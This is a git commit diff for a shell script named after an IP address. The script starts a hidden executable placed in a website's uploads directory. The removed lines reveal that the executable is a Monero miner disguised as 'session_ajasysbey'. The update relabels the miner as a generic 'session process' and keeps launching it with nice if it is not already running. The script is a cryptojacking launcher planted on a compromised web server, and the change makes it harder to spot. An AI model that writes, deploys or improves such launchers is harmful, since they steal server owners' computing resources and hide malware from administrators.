3a7aaa75f3e9d7a917784d00f23b26de17fcba21
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-11 14:28:47 +0800

    Update 128.199.127.217.sh v2

--- 128.199.127.217.sh
+++ 128.199.127.217.sh
@@ -1,7 +1,19 @@
 #!/bin/bash
-if ! pidof session_ajasysbey >/dev/null; then
-  nice /var/www/html/colortech/api/uploads/ransom/tmp/sess_aksd19sb187ss1ia901b23/session_ajasysbey $*
+
+# Full path to the session file
+SESSION_FILE="/var/www/html/colortech/api/uploads/ransom/tmp/sess_aksd19sb187ss1ia901b23/session_ajasysbey"
+
+# Check if the session process is active
+if ps -e | grep session_; then
+    echo "Session process is active"
 else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall session_ajasysbey\" or \"sudo killall session_ajasysbey\" if you want to remove background miner first."
+    echo "Session process is not active, running the specified executable file with nice"
+    # Check if the session file exists
+    if [ -x "$SESSION_FILE" ]; then
+        # Run the session file with nice
+        nice "$SESSION_FILE" "$@"
+    else
+        echo "Error: Session file does not exist or is not executable"
+        exit 1
+    fi
 fi
